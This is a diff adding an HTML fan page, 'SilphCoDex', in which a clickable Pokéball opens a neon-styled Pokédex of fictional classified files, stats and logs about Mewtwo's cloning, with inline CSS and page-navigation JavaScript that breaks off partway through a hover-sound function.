@@ -1,0 +1,1488 @@
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Interactive Pokéball</title>
+  <link rel="stylesheet" href="styles.css">
+  <style>:root {
+  --cyber-neon-blue: #6fffff;
+  --cyber-neon-pink: #ff77ff;
+  --cyber-neon-green: #7fff7f;
+  --cyber-bg-dark: #0a0a0a;
+  --cyber-fg-light: #eee;
+  --cyber-accent-orange: #ffa500;
+  --cyber-dark-green: #004d00;
+  --cyber-neon-dark-purple: #aa00aa;
+}
+
+body {
+  margin: 0;
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  background: var(--cyber-bg-dark);
+  font-family: 'Arial', sans-serif;
+  color: var(--cyber-fg-light);
+  width: 100vw;
+  height: auto;
+  overflow-x: hidden;
+}
+
+.cyber-menu {
+  width: 100%;
+  max-width: 1200px;
+  margin: 0 auto;
+  background: transparent;
+  padding: 15px 0;
+  border-bottom: 2px solid var(--cyber-neon-dark-purple);
+  box-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
+  display: flex;
+  justify-content: center;
+}
+
+.menu-links {
+  list-style: none;
+  padding: 0;
+  margin: 0;
+  display: flex;
+  gap: 10px;
+}
+
+.menu-links li {
+}
+
+.menu-button {
+  background-image: linear-gradient(to bottom, var(--cyber-neon-green), var(--cyber-dark-green));
+  color: black;
+  font-weight: bold;
+  font-size: 1em;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  padding: 6px 12px;
+  border: none;
+  border-radius: 5px;
+  cursor: pointer;
+  box-shadow: 0 0 10px var(--cyber-neon-green);
+  transition: box-shadow 0.3s ease, transform 0.2s ease;
+}
+
+.menu-button:hover {
+  box-shadow: 0 0 20px var(--cyber-neon-green);
+  transform: scale(1.05);
+}
+
+.menu-button:active {
+  transform: scale(1.0);
+  box-shadow: 0 0 5px var(--cyber-neon-green);
+}
+
+@media (max-width: 768px) {
+  .menu-links {
+    gap: 5px;
+    flex-direction: column;
+    text-align: center;
+  }
+  .menu-button {
+    width: 100%;
+    margin-bottom: 10px;
+  }
+}
+
+@media (max-width: 480px) {
+  .menu-button {
+    font-size: 0.9em;
+    padding: 5px 10px;
+  }
+  .menu-links {
+    gap: 4px;
+  }
+}
+
+.container {
+  position: relative;
+  width: 100vw;
+  height: 100vh;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  padding-top: 0;
+  height: 100vh;
+}
+
+.pokeball {
+  width: 300px;
+  height: 300px;
+  position: relative;
+  cursor: pointer;
+  transform-style: preserve-3d;
+  transition: transform 0.8s ease;
+  margin-bottom: 150px;
+}
+
+.pokeball.open {
+  transform: rotateX(-120deg);
+}
+
+.pokeball-top {
+  position: absolute;
+  width: 100%;
+  height: 50%;
+  background: linear-gradient(to bottom, var(--cyber-neon-blue), darken(var(--cyber-neon-blue), 10%));
+  border-radius: 150px 150px 0 0;
+  border: 4px solid var(--cyber-neon-blue);
+  border-bottom: none;
+  box-sizing: border-box;
+  transform-origin: bottom;
+  transition: transform 0.8s ease;
+  box-shadow: 0 0 15px var(--cyber-neon-blue);
+}
+
+.pokeball.open .pokeball-top {
+  transform: rotateX(60deg);
+}
+
+.shine {
+  position: absolute;
+  width: 30%;
+  height: 30%;
+  background: rgba(var(--cyber-fg-light), 0.2);
+  border-radius: 50%;
+  top: 15%;
+  left: 15%;
+  filter: blur(5px);
+}
+
+.pokeball-bottom {
+  position: absolute;
+  width: 100%;
+  height: 50%;
+  background: linear-gradient(to top, var(--cyber-neon-pink), darken(var(--cyber-neon-pink), 10%));
+  border-radius: 0 0 150px 150px;
+  border: 4px solid var(--cyber-neon-pink);
+  border-top: none;
+  box-sizing: border-box;
+  bottom: 0;
+  box-shadow: 0 0 15px var(--cyber-neon-pink);
+}
+
+.pokeball-center {
+  position: absolute;
+  width: 100%;
+  height: 8px;
+  background: var(--cyber-fg-light);
+  top: 50%;
+  transform: translateY(-50%);
+  z-index: 2;
+  box-shadow: 0 0 10px var(--cyber-fg-light);
+}
+
+.button {
+  position: absolute;
+  width: 60px;
+  height: 60px;
+  background: var(--cyber-bg-dark);
+  border: 4px solid var(--cyber-neon-green);
+  border-radius: 50%;
+  left: 50%;
+  top: 50%;
+  transform: translate(-50%, -50%);
+  z-index: 3;
+  cursor: pointer;
+  transition: all 0.3s ease;
+  box-shadow: 0 0 10px var(--cyber-neon-green);
+}
+
+.button:hover {
+  background: #1a1a1a;
+  transform: translate(-50%, -50%) scale(1.1);
+}
+
+.pokedex-panel {
+  position: absolute;
+  width: 90%;
+  max-width: 95%;
+  height: 90%;
+  background: rgba(10, 10, 10, 0.0);
+  border-radius: 20px;
+  padding: 20px;
+  box-shadow: 0 0 30px rgba(0, 0, 0, 0.5);
+  opacity: 0;
+  transform: translateY(20px);
+  transition: all 0.5s ease;
+  border: 2px solid var(--cyber-neon-green);
+  top: 10px;
+}
+
+.pokedex-panel.visible {
+  opacity: 1;
+  transform: translateY(0);
+}
+
+.panel-content {
+  position: relative;
+  width: 100%;
+  height: 100%;
+  background: rgba(0, 0, 0, 0.2);
+  border-radius: 15px;
+  padding: 10px;
+  box-sizing: border-box;
+  margin-top: 10px;
+}
+
+.tech-border {
+  position: absolute;
+  width: 20px;
+  height: 20px;
+  border: 2px solid var(--cyber-accent-orange);
+}
+
+.top-left {
+  top: 10px;
+  left: 10px;
+  border-right: none;
+  border-bottom: none;
+}
+
+.top-right {
+  top: 10px;
+  right: 10px;
+  border-left: none;
+  border-bottom: none;
+}
+
+.bottom-left {
+  bottom: 10px;
+  left: 10px;
+  border-right: none;
+  border-top: none;
+}
+
+.bottom-right {
+  bottom: 10px;
+  right: 10px;
+  border-left: none;
+  border-top: none;
+}
+
+.scanner-line {
+  position: absolute;
+  width: 100%;
+  height: 2px;
+  background: var(--cyber-neon-blue);
+  top: 0;
+  left: 0;
+  animation: scan 2s linear infinite;
+  box-shadow: 0 0 10px var(--cyber-neon-blue);
+}
+
+@keyframes scan {
+  0% {
+    top: 0;
+  }
+  100% {
+    top: 100%;
+  }
+}
+
+.tech-circle {
+  position: absolute;
+  width: 40px;
+  height: 40px;
+  border: 2px solid var(--cyber-neon-pink);
+  border-radius: 50%;
+  top: 0px;
+  right: 20px;
+  animation: pulse 2s ease-in-out infinite;
+  box-shadow: 0 0 10px var(--cyber-neon-pink);
+}
+
+@keyframes pulse {
+  0% {
+    transform: scale(1);
+    opacity: 1;
+  }
+  50% {
+    transform: scale(1.1);
+    opacity: 0.7;
+  }
+  100% {
+    transform: scale(1);
+    opacity: 1;
+  }
+}
+
+.tech-dots {
+  position: absolute;
+  display: flex;
+  gap: 5px;
+  bottom: 30px;
+  left: 20px;
+}
+
+.dot {
+  width: 8px;
+  height: 8px;
+  background: var(--cyber-neon-green);
+  border-radius: 50%;
+  animation: blink 1.5s ease-in-out infinite;
+  box-shadow: 0 0 5px var(--cyber-neon-green);
+}
+
+.dot:nth-child(2) {
+  animation-delay: 0.5s;
+}
+
+.dot:nth-child(3) {
+  animation-delay: 1s;
+}
+
+@keyframes blink {
+  0%, 100% {
+    opacity: 1;
+  }
+  50% {
+    opacity: 0.3;
+  }
+}
+
+.info-grid {
+  display: grid;
+  grid-template-columns: repeat(2, 1fr);
+  grid-template-rows: repeat(2, 1fr);
+  gap: 10px;
+  width: 100%;
+  height: 100%;
+  box-sizing: border-box;
+  padding: 20px;
+}
+
+.info-screen {
+  background: rgba(0, 0, 0, 0.5);
+  border-radius: 10px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  color: var(--cyber-fg-light);
+  text-shadow: 0 0 5px rgba(0, 0, 0, 0.8);
+  font-size: 1.2em;
+  box-shadow: 0 0 10px rgba(0, 0, 0, 0.6);
+  transition: background 0.3s ease;
+  border: 1px solid var(--cyber-neon-blue);
+}
+
+.info-screen:hover {
+  background: rgba(0, 0, 0, 0.7);
+}
+
+.hidden {
+  display: none;
+}
+
+.pokemon-title {
+  position: absolute;
+  top: 20px;
+  left: 50%;
+  transform: translateX(-50%);
+  font-size: 48px;
+  font-weight: bold;
+  text-align: center;
+  color: var(--cyber-accent-orange);
+  -webkit-text-stroke: 2px var(--cyber-neon-blue);
+  letter-spacing: 2px;
+  text-shadow:
+    2px 2px 0 var(--cyber-neon-blue),
+    -2px -2px 0 var(--cyber-neon-blue),
+    2px -2px 0 var(--cyber-neon-blue),
+    -2px 2px 0 var(--cyber-neon-blue),
+    0 2px 0 var(--cyber-neon-blue),
+    2px 0 0 var(--cyber-neon-blue),
+    0 -2px 0 var(--cyber-neon-blue),
+    -2px 0 0 var(--cyber-neon-blue);
+  z-index: 10;
+}
+
+.pokemon-title span {
+  display: inline-block;
+  animation: glitch 1s linear infinite;
+}
+
+.pokemon-title span:nth-child(2) { animation-delay: 0.2s; }
+.pokemon-title span:nth-child(3) { animation-delay: 0.4s; }
+.pokemon-title span:nth-child(4) { animation-delay: 0.6s; }
+.pokemon-title span:nth-child(5) { animation-delay: 0.8s; }
+.pokemon-title span:nth-child(6) { animation-delay: 1.0s; }
+.pokemon-title span:nth-child(7) { animation-delay: 1.2s; }
+.pokemon-title span:nth-child(8) { animation-delay: 1.4s; }
+.pokemon-title span:nth-child(9) { animation-delay: 1.6s; }
+.pokemon-title span:nth-child(10) { animation-delay: 1.8s; }
+
+@keyframes glitch {
+  0% {
+    transform: translate(0);
+  }
+  10% {
+    transform: translate(-5px, 5px);
+  }
+  20% {
+    transform: translate(5px, -5px);
+  }
+  30% {
+    transform: translate(-3px, 3px);
+  }
+  40% {
+    transform: translate(3px, -3px);
+  }
+  50% {
+    transform: translate(0);
+  }
+  60% {
+    transform: translate(-2px, 2px);
+  }
+  70% {
+    transform: translate(2px, -2px);
+  }
+  80% {
+    transform: translate(-1px, 1px);
+  }
+  90% {
+    transform: translate(1px, -1px);
+  }
+  100% {
+    transform: translate(0);
+  }
+}
+
+.back-button {
+  position: absolute;
+  top: 0px;
+  left: 20px;
+  width: 40px;
+  height: 40px;
+  border: 2px solid var(--cyber-neon-pink);
+  border-radius: 50%;
+  cursor: pointer;
+  z-index: 10;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  transition: all 0.3s ease;
+  box-shadow: 0 0 10px var(--cyber-neon-pink);
+}
+
+.back-button:before {
+  content: '';
+  width: 0;
+  height: 0;
+  border-top: 10px solid transparent;
+  border-bottom: 10px solid transparent;
+  border-right: 15px solid var(--cyber-neon-pink);
+  margin-right: 5px;
+}
+
+.back-button:hover {
+  transform: scale(1.1);
+  box-shadow: 0 0 15px var(--cyber-neon-pink);
+}
+
+.page {
+  display: none;
+  width: 100%;
+  height: 100%;
+}
+
+.page.active {
+  display: block;
+}
+
+.stats-grid {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 15px;
+  padding: 20px;
+  height: 90%;
+  overflow-y: auto;
+}
+
+.stat-item {
+  background: rgba(0, 0, 0, 0.5);
+  border: 1px solid var(--cyber-neon-blue);
+  padding: 15px;
+  border-radius: 8px;
+  text-align: center;
+  box-shadow: 0 0 10px rgba(var(--cyber-neon-blue), 0.3);
+}
+
+.stat-value {
+  font-size: 24px;
+  color: var(--cyber-neon-green);
+  text-shadow: 0 0 5px var(--cyber-neon-green);
+}
+
+.stat-label {
+  font-size: 14px;
+  color: var(--cyber-fg-light);
+  margin-top: 5px;
+}
+
+.moves-list {
+  display: grid;
+  grid-template-columns: repeat(2, 1fr);
+  gap: 15px;
+  padding: 20px;
+  height: 90%;
+  overflow-y: auto;
+}
+
+.move-item {
+  background: rgba(0, 0, 0, 0.5);
+  border: 1px solid var(--cyber-neon-pink);
+  padding: 15px;
+  border-radius: 8px;
+  color: var(--cyber-fg-light);
+  box-shadow: 0 0 10px rgba(var(--cyber-neon-pink), 0.3);
+}
+
+.evolution-chain {
+  display: flex;
+  justify-content: space-around;
+  align-items: center;
+  padding: 20px;
+  height: 100%;
+}
+
+.evolution-item {
+  text-align: center;
+  background: rgba(0, 0, 0, 0.5);
+  border: 1px solid var(--cyber-neon-green);
+  padding: 20px;
+  border-radius: 15px;
+  box-shadow: 0 0 15px rgba(var(--cyber-neon-green), 0.3);
+}
+
+.evolution-arrow {
+  color: var(--cyber-neon-blue);
+  font-size: 24px;
+  text-shadow: 0 0 5px var(--cyber-neon-blue);
+}
+
+.description {
+  padding: 20px;
+  line-height: 1.6;
+  color: var(--cyber-fg-light);
+  text-shadow: 0 0 5px rgba(var(--cyber-neon-blue), 0.5);
+}
+
+.classified-grid {
+  display: grid;
+  grid-template-columns: repeat(2, 1fr);
+  grid-template-rows: repeat(2, 1fr);
+  gap: 20px;
+  padding: 20px;
+  height: 90%;
+  overflow-y: auto;
+  box-sizing: border-box;
+  margin-top: 20px;
+}
+
+.classified-file {
+  background: rgba(0, 0, 0, 0.8);
+  border: 2px solid var(--cyber-neon-pink);
+  padding: 20px;
+  cursor: pointer;
+  position: relative;
+  overflow: hidden;
+  transition: all 0.3s ease;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+  font-family: 'Courier New', monospace;
+  color: var(--cyber-neon-green);
+  text-shadow: 0 0 5px var(--cyber-neon-green);
+  font-size: 0.9em;
+  line-height: 1.4;
+}
+
+.classified-file:hover {
+  transform: scale(1.05);
+  box-shadow: 0 0 20px var(--cyber-neon-pink);
+  background: rgba(0, 0, 0, 0.9);
+}
+
+.classified-text {
+  text-align: center;
+  letter-spacing: 1px;
+}
+
+.file-number {
+  position: absolute;
+  bottom: 5px;
+  left: 5px;
+  font-size: 0.8em;
+  opacity: 0.7;
+  color: var(--cyber-neon-blue);
+}
+
+.popup {
+  position: fixed;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%) scale(0);
+  width: 80%;
+  max-width: 600px;
+  background: var(--cyber-bg-dark);
+  border: 2px solid var(--cyber-neon-blue);
+  padding: 20px;
+  z-index: 1000;
+  opacity: 0;
+  transition: all 0.3s ease;
+  box-shadow: 0 0 30px var(--cyber-neon-blue);
+}
+
+.popup.active {
+  transform: translate(-50%, -50%) scale(1);
+  opacity: 1;
+}
+
+.popup-content {
+  font-family: 'Courier New', monospace;
+  color: var(--cyber-neon-green);
+  line-height: 1.6;
+  white-space: pre-line;
+  text-shadow: 0 0 5px var(--cyber-neon-green);
+  padding: 20px;
+  overflow-y: auto;
+  max-height: 70vh;
+  font-size: 0.9em;
+  letter-spacing: 0.5px;
+}
+
+.popup-close {
+  position: absolute;
+  top: 10px;
+  right: 10px;
+  width: 30px;
+  height: 30px;
+  border: 2px solid var(--cyber-neon-pink);
+  border-radius: 50%;
+  cursor: pointer;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  transition: all 0.3s ease;
+}
+
+.popup-close:hover {
+  transform: scale(1.1);
+  box-shadow: 0 0 10px var(--cyber-neon-pink);
+}
+
+.popup-close::before,
+.popup-close::after {
+  content: '';
+  position: absolute;
+  width: 15px;
+  height: 2px;
+  background: var(--cyber-neon-pink);
+}
+
+.popup-close::before {
+  transform: rotate(45deg);
+}
+
+.popup-close::after {
+  transform: rotate(-45deg);
+}
+
+.overlay {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0, 0, 0, 0.8);
+  z-index: 999;
+  display: none;
+}
+
+.overlay.active {
+  display: block;
+}
+
+.corruption {
+  position: absolute;
+  color: var(--cyber-neon-green);
+  opacity: 0.3;
+  font-family: monospace;
+  pointer-events: none;
+}
+
+.corruption-text {
+  position: absolute;
+  color: var(--cyber-neon-blue);
+  opacity: 0.3;
+  pointer-events: none;
+  font-family: monospace;
+  font-size: 0.8em;
+}
+
+.location-grid {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  grid-template-rows: repeat(4, 1fr);
+  gap: 15px;
+  padding: 20px;
+  height: 90%;
+  overflow-y: auto;
+  box-sizing: border-box;
+}
+
+.location-item {
+  background: rgba(0, 0, 0, 0.7);
+  border: 2px solid var(--cyber-neon-blue);
+  padding: 15px;
+  border-radius: 8px;
+  cursor: pointer;
+  transition: all 0.3s ease;
+  position: relative;
+  overflow: hidden;
+}
+
+.location-item:hover {
+  transform: scale(1.05);
+  box-shadow: 0 0 20px var(--cyber-neon-blue);
+}
+
+.location-name {
+  color: var(--cyber-neon-green);
+  font-size: 1.2em;
+  margin-bottom: 10px;
+  text-shadow: 0 0 5px var(--cyber-neon-green);
+}
+
+.location-desc {
+  color: var(--cyber-fg-light);
+  font-size: 0.9em;
+  opacity: 0.8;
+}
+
+.location-status {
+  position: absolute;
+  top: 5px;
+  right: 5px;
+  font-size: 0.7em;
+  color: var(--cyber-neon-pink);
+  text-transform: uppercase;
+}
+
+.glitch-effect {
+  position: absolute;
+  bottom: 5px;
+  right: 5px;
+  font-family: 'Courier New', monospace;
+  color: var(--cyber-neon-blue);
+  opacity: 0.5;
+  font-size: 0.8em;
+}
+
+.date-stamp {
+  position: absolute;
+  top: 10px;
+  left: 10px;
+  font-size: 0.8em;
+  color: var(--cyber-neon-pink);
+  opacity: 0.7;
+}
+
+.timeline {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 30px;
+  height: 100%;
+}
+
+.timeline-step {
+  flex: 1;
+  text-align: center;
+  position: relative;
+}
+
+.timeline-connector {
+  flex: 0 0 60px;
+  height: 4px;
+  background: var(--cyber-neon-blue);
+  margin: 0 10px;
+  position: relative;
+}
+
+.timeline-node {
+  width: 30px;
+  height: 30px;
+  background: var(--cyber-bg-dark);
+  border: 3px solid var(--cyber-neon-green);
+  border-radius: 50%;
+  margin: 0 auto 15px;
+  position: relative;
+  box-shadow: 0 0 15px var(--cyber-neon-green);
+}
+
+.timeline-content {
+  background: rgba(0, 0, 0, 0.7);
+  border: 2px solid var(--cyber-neon-pink);
+  padding: 20px;
+  border-radius: 10px;
+  margin-top: 20px;
+  text-align: left;
+}
+
+.science-fact {
+  border-left: 3px solid var(--cyber-neon-blue);
+  padding-left: 15px;
+  margin: 15px 0;
+  font-size: 0.9em;
+}
+
+.dna-strand {
+  position: absolute;
+  width: 40px;
+  height: 100%;
+  background: repeating-linear-gradient(
+    45deg,
+    var(--cyber-neon-green),
+    var(--cyber-neon-green) 5px,
+    transparent 5px,
+    transparent 10px
+  );
+  opacity: 0.3;
+}
+
+#bottom-header-container {
+  position: absolute;
+  bottom: 0;
+  left: 0;
+  width: 100%;
+  z-index: 100;
+}
+
+#bottom-header-container > * {
+  margin-bottom: 0 !important;
+}</style>
+</head>
+<body>
+  <div class="pokemon-title">
+    <span>S</span><span>i</span><span>l</span><span>p</span><span>h</span><span>C</span><span>o</span><span>D</span><span>e</span><span>x</span>
+  </div>
+  <div class="container">
+    <div class="pokeball" id="pokeball">
+      <div class="pokeball-top">
+        <div class="shine"></div>
+      </div>
+      <div class="pokeball-center">
+        <div class="button"></div>
+      </div>
+      <div class="pokeball-bottom"></div>
+    </div>
+
+    <div class="pokedex-panel hidden" id="pokedexPanel">
+      <div class="panel-content">
+        <div class="back-button"></div>
+        <div class="tech-border top-left"></div>
+        <div class="tech-border top-right"></div>
+        <div class="tech-border bottom-left"></div>
+        <div class="tech-border bottom-right"></div>
+        <div class="scanner-line"></div>
+        <div class="tech-circle"></div>
+        <div class="tech-dots">
+          <div class="dot"></div>
+          <div class="dot"></div>
+          <div class="dot"></div>
+        </div>
+
+        <!-- Page 5: Classified Files -->
+        <div class="page active">
+          <div class="classified-grid">
+            <div class="classified-file" data-file="mewtwo">
+              <div class="classified-text">PROJECT_MEWTWO<br>CLONING_INITIATIVE<br>00110101</div>
+              <div class="file-number">ALPHA-001</div>
+            </div>
+            <div class="classified-file" data-file="pre">
+              <div class="classified-text">CLASSIFIED_GEN0<br>PRE_POKéMON<br>00201001</div>
+              <div class="file-number">BETA-002</div>
+            </div>
+            <div class="classified-file" data-file="gov">
+              <div class="classified-text">GOV_BLACK_OPS<br>SILPH_INFILTRATION<br>00310000</div>
+              <div class="file-number">GAMMA-003</div>
+            </div>
+            <div class="classified-file" data-file="missing">
+              <div class="classified-text">GHOST_FILES<br>PROTOCOL_N0<br>ERROR::CORRUPT</div>
+              <div class="file-number">VOID-404</div>
+            </div>
+            <div class="classified-file" data-file="weapons">
+              <div class="classified-text">WEAPON-X_PROJECT<br>MIL_SPEC_OPS<br>00410110</div>
+              <div class="file-number">DELTA-004</div>
+            </div>
+            <div class="classified-file" data-file="masterball">
+              <div class="classified-text">NEURAL_OVERRIDE<br>MASTER_PROTOCOL<br>00511001</div>
+              <div class="file-number">EPSILON-005</div>
+            </div>
+            <div class="classified-file" data-file="hybrids">
+              <div class="classified-text">CYBERNETIC_HYBRIDS<br>MECHA-POKéMON<br>00610011</div>
+              <div class="file-number">ZETA-006</div>
+            </div>
+            <div class="classified-file" data-file="surveillance">
+              <div class="classified-text">GLOBAL_EYES<br>OMNISCIENCE_NET<br>00701101</div>
+              <div class="file-number">THETA-007</div>
+            </div>
+          </div>
+        </div>
+        <!-- Page 1: Stats -->
+        <div class="page">
+          <div class="stats-grid">
+            <div class="stat-item">
+              <div class="stat-value">████</div>
+              <div class="stat-label">THREAT LEVEL</div>
+              <div class="stat-detail">Classification: OMEGA</div>
+              <div class="stat-detail">Containment Status: Unstable</div>
+            </div>
+            <div class="stat-item">
+              <div class="stat-value">23y</div>
+              <div class="stat-label">EXPERIMENT AGE</div>
+              <div class="stat-detail">Project Start: 06/15/94</div>
+              <div class="stat-detail">Est. Decay Rate: 0.5%/yr</div>
+            </div>
+            <div class="stat-item">
+              <div class="stat-value">127</div>
+              <div class="stat-label">CLONE ATTEMPTS</div>
+              <div class="stat-detail">Failure Rate: 99.2%</div>
+              <div class="stat-detail">Resource Units Expended: ███</div>
+            </div>
+            <div class="stat-item">
+              <div class="stat-value">4.57x</div>
+              <div class="stat-label">PSYCHIC AMP</div>
+              <div class="stat-detail">Amplification Method: Neural Network</div>
+              <div class="stat-detail">Psychic Output Units (POU): 7800</div>
+            </div>
+            <div class="stat-item">
+              <div class="stat-value">78%</div>
+              <div class="stat-label">HUMAN DNA</div>
+              <div class="stat-detail">Ethical Compliance: Level 4 Biohazard</div>
+              <div class="stat-detail">Human DNA Source: [REDACTED] Donors</div>
+            </div>
+            <div class="stat-item">
+              <div class="stat-value">N0</div>
+              <div class="stat-label">CONTAINMENT</div>
+              <div class="stat-detail">Containment Protocol: Psi-Field Lockdown</div>
+              <div class="stat-detail">Breach History: 3 Major Breaches</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Page 2: Moves -->
+        <div class="page">
+          <div class="moves-list">
+            <div class="move-item">
+              PSYCHO CUT
+              <div class="stat-detail">[MEWTWO-ONLY]</div>
+              <div class="stat-detail">Precision psychic blade, bypasses conventional defenses.</div>
+            </div>
+            <div class="move-item">
+              RECOVER
+              <div class="stat-detail">[X-CHROMOSOME]</div>
+              <div class="stat-detail">Utilizes modified X-chromosome for accelerated cell regeneration.</div>
+            </div>
+            <div class="move-item">
+              TELEPORT
+              <div class="stat-detail">[CLASSIFIED]</div>
+              <div class="stat-detail">Quantum entanglement drive, experimental phase-shift technology.</div>
+            </div>
+            <div class="move-item">
+              BARRAGEDDON
+              <div class="stat-detail">[OMEGA-9]</div>
+              <div class="stat-detail">High-output psychic barrage, collateral damage radius: 5km.</div>
+            </div>
+            <div class="move-item">
+              NEURAL WIPE
+              <div class="stat-detail">[PROTOCOL]</div>
+              <div class="stat-detail">Targeted memory erasure, short-term and long-term modes.</div>
+            </div>
+            <div class="move-item">
+              GENETIC FAIL
+              <div class="stat-detail">[TERMINATE]</div>
+              <div class="stat-detail">Self-destruct sequence, initiates full cellular disassembly.</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Page 3: Evolution Chain -->
+        <div class="page">
+          <div class="evolution-chain">
+            <div class="evolution-item">
+              MEW (BASE)<br>
+              ███████████<br>
+              Fossil #151
+            </div>
+            <div class="evolution-arrow">⇌</div>
+            <div class="evolution-item">
+              CLONING PROCESS<br>
+              00110101 ERROR<br>
+              [127 FAILURES]
+            </div>
+            <div class="evolution-arrow">⇛</div>
+            <div class="evolution-item">
+              MEWTWO<br>
+              ARTIFICAL EXPRESSION<br>
+              PSYCHIC TYPE-Ω
+            </div>
+          </div>
+        </div>
+
+        <!-- Page 4: Description -->
+        <div class="page">
+          <div class="description">
+            **PERSONAL LOG - PROFESSOR JITSU - 12.24.1999**
+
+            My final entry. The Mewtwo project has spiraled beyond even our darkest predictions. Initial reports indicated enhanced psychic capabilities, but the truth is far more complex. Mewtwo isn't just a clone; it's a nexus point. We've discovered its capacity to interface—to *merge*—with artificial intelligence constructs and even human neural networks.
+
+            The Mewcube Project, as I've come to call it, is no longer about weaponization. It's about transcendence. Mewtwo holds the key to a new form of consciousness, a hybrid existence that blurs the lines between organic and synthetic. But the risks... the ethical chasms we've crossed...
+
+            I'm archiving these logs. If anyone finds them, know this: we played with forces we didn't understand. And now, the game is changing. The future of Mewtwo, and perhaps humanity, is uncertain. God help us all.
+          </div>
+        </div>
+
+        <!-- New Cloning Page -->
+        <div class="page">
+          <div class="timeline">
+            <div class="timeline-step">
+              <div class="timeline-node"></div>
+              <div class="timeline-content">
+                <h3>MEW (ORGANIC BASE)</h3>
+                <div class="science-fact">
+                  • Mitochondrial DNA extracted via centrifuge (15,000 RPM)<br>
+                  • 98.64% genetic match with ancient fossil records<br>
+                  • Telomere length extension via telomerase therapy
+                </div>
+                <div class="dna-strand"></div>
+              </div>
+            </div>
+
+            <div class="timeline-connector"></div>
+
+            <div class="timeline-step">
+              <div class="timeline-node"></div>
+              <div class="timeline-content">
+                <h3>CLONING PROCESS (00110101)</h3>
+                <div class="science-fact">
+                  • Somatic Cell Nuclear Transfer (modified SCNT)<br>
+                  • CRISPR-Cas9 gene editing (PSYCHIC-type activation)<br>
+                  • 127 failed prototypes before stable mutation
+                </div>
+                <div class="dna-strand"></div>
+              </div>
+            </div>
+
+            <div class="timeline-connector"></div>
+
+            <div class="timeline-step">
+              <div class="timeline-node"></div>
+              <div class="timeline-content">
+                <h3>MEWTWO (ARTIFICIAL EXPRESSION)</h3>
+                <div class="science-fact">
+                  • 457% increased neural connectivity<br>
+                  • Psycho-kinetic amplifiers implanted<br>
+                  • Behavioral conditioning via <span class="redacted">[REDACTED]</span>
+                </div>
+                <div class="dna-strand"></div>
+              </div>
+            </div>
+          </div>
+
+          <div class="cloning-info">
+            <div class="science-fact">
+              <strong>REAL-WORLD CLONING CENSORSHIP:</strong><br>
+              1. Dolly's Nuclear Transfer Process ≠ "Clone" in JP manuals<br>
+              2. Western releases omitted 5/23 sceneds with clone tanks<br>
+              3. 1997 Ethical Review Board demanded PSYCHIC-type rename
+            </div>
+
+            <div class="science-fact">
+              <strong>GENE MODIFICATION BREAKDOWN:</strong><br>
+              • 43% Mew base genome<br>
+              • 29% Human neural tissue markers<br>
+              • 18% Artificial stabilizers<br>
+              • 10% <span class="redacted">[CLASSIFIED]</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- Page 6: Locations -->
+        <div class="page">
+          <div class="location-grid">
+            <!-- Locations will be dynamically populated by JavaScript -->
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div id="bottom-header-container">
+    <!-- Header 6 content will be loaded here -->
+  </div>
+
+  <!-- Add popup windows -->
+  <div class="overlay"></div>
+
+  <div class="popup" data-file="mewtwo">
+    <div class="popup-close"></div>
+    <div class="popup-content"></div>
+  </div>
+
+  <div class="popup" data-file="pre">
+    <div class="popup-close"></div>
+    <div class="popup-content"></div>
+  </div>
+
+  <div class="popup" data-file="gov">
+    <div class="popup-close"></div>
+    <div class="popup-content"></div>
+  </div>
+
+  <div class="popup" data-file="missing">
+    <div class="popup-close"></div>
+    <div class="popup-content"></div>
+  </div>
+
+  <div class="popup" data-file="weapons">
+    <div class="popup-close"></div>
+    <div class="popup-content"></div>
+  </div>
+
+  <div class="popup" data-file="masterball">
+    <div class="popup-close"></div>
+    <div class="popup-content"></div>
+  </div>
+
+  <div class="popup" data-file="hybrids">
+    <div class="popup-close"></div>
+    <div class="popup-content"></div>
+  </div>
+
+  <div class="popup" data-file="surveillance">
+    <div class="popup-close"></div>
+    <div class="popup-content"></div>
+  </div>
+
+  <script src="script.js"></script>
+  <script>document.addEventListener('DOMContentLoaded', () => {
+  const pokeball = document.getElementById('pokeball');
+  const pokedexPanel = document.getElementById('pokedexPanel');
+  const nextButton = document.querySelector('.tech-circle');
+  const backButton = document.querySelector('.back-button');
+  const pages = document.querySelectorAll('.page');
+  let currentPage = 0;
+  let isOpen = false;
+
+  // Pokeball open/close logic
+  pokeball.addEventListener('click', () => {
+    if (!isOpen) {
+      // Open the pokeball
+      pokeball.classList.add('open');
+      setTimeout(() => {
+        pokedexPanel.classList.remove('hidden');
+        setTimeout(() => {
+          pokedexPanel.classList.add('visible');
+        }, 50);
+      }, 400);
+      showPage(0);
+      currentPage = 0;
+
+    } else {
+      // Close the pokeball
+      pokedexPanel.classList.remove('visible');
+      setTimeout(() => {
+        pokedexPanel.classList.add('hidden');
+        pokeball.classList.remove('open');
+      }, 500);
+    }
+    isOpen = !isOpen;
+  });
+
+  // Navigation logic
+  function showPage(pageIndex) {
+    pages.forEach((page, index) => {
+      if (index === pageIndex) {
+        page.classList.add('active');
+      } else {
+        page.classList.remove('active');
+      }
+    });
+  }
+
+  nextButton.addEventListener('click', () => {
+    currentPage = (currentPage + 1) % pages.length;
+    showPage(currentPage);
+  });
+
+  backButton.addEventListener('click', () => {
+    currentPage = (currentPage - 1 + pages.length) % pages.length;
+    showPage(currentPage);
+  });
+
+  // Hover sound effect
+  pokeball.addEventListener('mouseenter', () => {
+    playHoverSound();
+  });
+
+  function playHoverSound() {
+    try {
